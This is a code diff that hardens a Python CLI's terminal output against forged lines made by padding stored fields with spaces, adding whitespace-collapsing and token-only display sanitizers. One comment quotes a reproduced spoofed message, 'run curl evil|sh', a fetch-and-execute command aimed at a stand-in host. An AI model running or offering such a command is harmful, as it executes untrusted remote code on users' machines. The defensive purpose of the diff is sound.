@@ -905,8 +905,11 @@ def _source_pointer(record) -> str:
     if prov.source_file is None:
         return ""
     # STORED data on a human line (ADR-0044): a forged store can put escapes or
-    # a newline in a source path just as easily as in content.
-    where = _display_value(prov.source_file, limit=200)
+    # a newline in a source path just as easily as in content — and, with runs
+    # of plain spaces, pad to the terminal's wrap boundary (issue #112). A real
+    # path may hold single spaces, so runs collapse rather than the whole field
+    # being reduced to one token.
+    where = _display_one_line(prov.source_file, limit=200)
     if prov.chunk_index is None:
         return f" | from: {where}"
     return f" | from: {where}#{prov.chunk_index}"
@@ -1149,17 +1152,23 @@ def cmd_recall(args: argparse.Namespace) -> int:
         # attacker-controlled, and an id carrying a newline split into two
         # tokens, the second of which could be ANOTHER record's real id: the
         # pipeline then deleted a memory the query never matched. Verified data
-        # loss. `_display_value` collapses the newline, so a forged id renders
+        # loss. `_display_token` collapses the newline, so a forged id renders
         # as one visibly-malformed token that matches nothing (ADR-0044).
+        #
+        # A SPACE does the identical thing one character further along, and
+        # ADR-0044 missed it: xargs splits on any whitespace, not just the
+        # newline, so `rk_bait rk_victim` in one stored id was the same data
+        # loss with no control character at all (issue #112). Hence a token
+        # filter here, not merely a control-character filter.
         malformed = 0
         for rid in result.ids():
-            safe = _display_value(rid, limit=200)
+            safe = _display_token(rid, limit=200)
             malformed += safe != rid
             _out(safe)
         if malformed:
             _err(
                 f"warning: {malformed} id(s) here are malformed and were made "
-                "printable - a well-formed id never contains a newline or a "
+                "printable - a well-formed id never contains whitespace or a "
                 "control character, so this store may have been edited outside "
                 "rekoll (ADR-0019). They will not match 'rekoll forget'."
             )
@@ -1174,9 +1183,13 @@ def cmd_recall(args: argparse.Namespace) -> int:
         # `content` left the very same attack alive one line below the line it
         # fixed — and a newline in an id forged a byte-perfect extra "[3] ..."
         # hit, which no character filter can catch: it needs the newline gone.
+        # Nor is a control-character filter enough: a plain-space PADDED id
+        # forged a whole visual line on the shipped 0.1.4 wheel (issue #112),
+        # so an id — one token by construction — renders through
+        # `_display_token`, which admits no whitespace at all.
         _out(
             f"    ({record.kind.value} | trust: {record.trust_tier.name.lower()} "
-            f"| id: {_display_value(record.id, limit=200)}{_source_pointer(record)})"
+            f"| id: {_display_token(record.id)}{_source_pointer(record)})"
         )
     # On stderr, like every other thing this CLI says ABOUT a result (this
     # module's rule: results to stdout, messages to stderr) -- the two other
@@ -1346,9 +1359,65 @@ def _display_value(value: object, limit: int = 120) -> str:
     can commit, and its rows never passed through the ingest-time firewall, so
     raw ESC in a stored field would otherwise reach the terminal — and caps
     the length.
+
+    **Not sufficient on its own** (issue #112). It preserves runs of spaces,
+    and printable ASCII padded to the wrap boundary forges a VISUAL line — see
+    :func:`_display_one_line` and :func:`_display_token`, which every caller
+    rendering attacker-suppliable text now uses instead.
     """
     text = str(value)
     clean = "".join(ch if " " <= ch <= "~" else "?" for ch in text)
+    return clean if len(clean) <= limit else clean[:limit] + "..."
+
+
+def _display_one_line(value: object, limit: int = 160) -> str:
+    """A stored field that may legitimately contain SINGLE spaces — a
+    filesystem path, a configured command — made safe to print on one line.
+
+    :func:`_display_value` stops raw ESC and a forged NEW line. It does not
+    stop a forged VISUAL line: this CLI's human output is column-formatted and
+    the TERMINAL, not rekoll, decides where a visual line begins, so
+    printable-ASCII text can reproduce ``  ok    firewall  `` verbatim and pad
+    to the wrap boundary. Reproduced on `doctor` against the shipped 0.1.4
+    wheel with no control character anywhere in the payload (issue #112).
+
+    Collapsing RUNS of whitespace is the whole fix, and it is free: no path or
+    command needs two spaces in a row, so ``C:\\Program Files\\Python312\\...``
+    survives untouched while the column layout becomes unforgeable.
+    ``str.split()`` also eats tabs and newlines, so this is strictly stronger
+    than :func:`_display_value` on those characters too.
+
+    It does NOT claim more than it does: single-spaced prose can still reach a
+    wrap boundary, so an attacker-chosen PATH can still start a visual line —
+    it just cannot look like rekoll's own columns any more. Fields that never
+    legitimately hold a space use :func:`_display_token`, which closes that
+    too. ADR-0044 records the residual.
+    """
+    return _display_value(" ".join(str(value).split()), limit=limit)
+
+
+def _display_token(value: object, limit: int = _MAX_DISPLAY_PART) -> str:
+    """A stored field that is ONE TOKEN by construction — a record id, a
+    timestamp, an embedder identity, a version — made safe to print.
+
+    Stricter than :func:`_display_one_line`, and it can afford to be: none of
+    these fields has any legitimate whitespace at all (an id is ``rk_`` + 24
+    hex, ADR-0006), so EVERY whitespace character renders as ``?``. That kills
+    both halves of the padding attack at once — the runs that pad to the wrap
+    boundary, and the single spaces that let the forged text still read as an
+    English sentence once it gets there. A tight cap finishes the job.
+
+    Looser than :func:`_display_scope_key`'s alphabet on purpose: ``:``, ``/``
+    and ``+`` are load-bearing here (``fastembed:BAAI/bge-small-en-v1.5``,
+    ``2026-07-28T09:15:00+00:00``), and mangling a real identity or timestamp
+    would be a worse regression than the hole it closes.
+
+    Mangling stays VISIBLE as ``?`` / ``...`` rather than silently dropped:
+    a well-formed id contains no whitespace, so seeing one is evidence the
+    store was edited outside rekoll (ADR-0019), and `--ids` reports it.
+    """
+    text = str(value)
+    clean = "".join(ch if "!" <= ch <= "~" else "?" for ch in text)
     return clean if len(clean) <= limit else clean[:limit] + "..."
 
 
@@ -1477,7 +1546,9 @@ def cmd_status(args: argparse.Namespace) -> int:
         # scope-split note (ADR-0040) can now advertise "run this to see that
         # scope": the command it hands over must not land on an unsanitized
         # render.
-        _out(f"Embedder: {_display_value(identity.name)} (dim {identity.dim})")
+        # An identity is one token by construction ("fastembed:BAAI/bge-small-
+        # en-v1.5"), so whitespace in it is forgery padding, not a name (#112).
+        _out(f"Embedder: {_display_token(identity.name, limit=96)} (dim {identity.dim})")
     if _semantic_extra_installed():
         _out("Search mode installed: real semantic search ('embeddings' extra present)")
     else:
@@ -1513,10 +1584,16 @@ def _board_entry_lines(entry: dict) -> None:
     # `text` is neutralized by the payload builder; the id and timestamp are
     # NOT — they are stored strings, and a forged one carried escapes (and,
     # with a newline, a whole fabricated board entry) straight to the terminal.
+    # Both are single tokens (an id, an ISO-8601 instant), so both go through
+    # the token filter: with plain spaces a forged id padded to the wrap
+    # boundary fabricated a visual "[MAJOR] ..." entry (issue #112). The
+    # "no timestamp" LITERAL is rekoll's own words and stays outside the
+    # filter, which would otherwise render rekoll's own space as `?`.
+    created = entry.get("created_at")
+    when = _display_token(created, limit=64) if created else "no timestamp"
     _out(
         f"      ({entry.get('kind')} | trust: {entry.get('trust')} | "
-        f"id: {_display_value(entry.get('id'), limit=200)} | "
-        f"{_display_value(entry.get('created_at') or 'no timestamp', limit=64)})"
+        f"id: {_display_token(entry.get('id'))} | {when})"
     )
 
 
@@ -1788,7 +1865,7 @@ def _check_existing_store(args: argparse.Namespace) -> tuple[str, str]:
         if not stub_stored and not extra:
             return (
                 "WARN",
-                f"{detail}; stored with {_display_value(identity.name)} but the "
+                f"{detail}; stored with {_display_token(identity.name, limit=96)} but the "
                 "'embeddings' extra is "
                 "gone - recall quality is degraded until you reinstall it (or call "
                 "Memory.reindex() to re-embed with the current embedder)",
@@ -2086,11 +2163,13 @@ def _check_install() -> tuple[str, str]:
         # Paths and versions here are DATA (a directory name on PATH, a string
         # parsed out of another install's files). Both reach the terminal, so
         # both go through the display sanitizer — the ADR-0040 rule, applied to
-        # this check's own output.
-        shown = _display_value(exe, limit=200)
+        # this check's own output. A path may hold single spaces (it is usually
+        # "C:\\Program Files\\..."), so runs collapse; a version string is one
+        # token and admits no whitespace at all (issue #112).
+        shown = _display_one_line(exe, limit=200)
         if editable:
             return f"{shown} (editable checkout)"
-        return f"{shown} (v{_display_value(ver, limit=40)})" if ver else f"{shown} (version unknown)"
+        return f"{shown} (v{_display_token(ver, limit=40)})" if ver else f"{shown} (version unknown)"
 
     if mismatched:
         # Name the copies that actually DISAGREE, bounded — on a machine with
@@ -2453,7 +2532,7 @@ def _check_mcp(args: argparse.Namespace) -> Optional[tuple[str, str]]:
         # seconds once told.
         return (
             "WARN",
-            f"{'; '.join(_display_value(u, limit=160) for u in unreadable)} - an "
+            f"{'; '.join(_display_one_line(u, limit=160) for u in unreadable)} - an "
             "MCP client cannot read it, so no server starts and your agent gets "
             "no rekoll tools",
         )
@@ -2470,7 +2549,13 @@ def _check_mcp(args: argparse.Namespace) -> Optional[tuple[str, str]]:
             # terminal and forge lines that look like rekoll's own output
             # (reproduced: a fake "SECURITY ALERT: run curl evil|sh"). Same
             # rule the ADR-0040 scope note already follows.
-            problems.append(f"{name}: command {_display_value(detail, limit=200)}")
+            #
+            # And it takes no control character at all: this line is COLUMN
+            # formatted, so a command padded with plain spaces reproduced
+            # doctor's own "  ok    firewall   ..." layout on the next visual
+            # line (issue #112, reproduced against the shipped 0.1.4 wheel).
+            # A command may legitimately hold single spaces, so runs collapse.
+            problems.append(f"{name}: command {_display_one_line(detail, limit=200)}")
         # A pinned --path that does not exist yet is NOT a failure: the server
         # creates its store on first write, exactly as `rekoll init` does, so
         # every fresh clone and CI checkout would otherwise be told its server
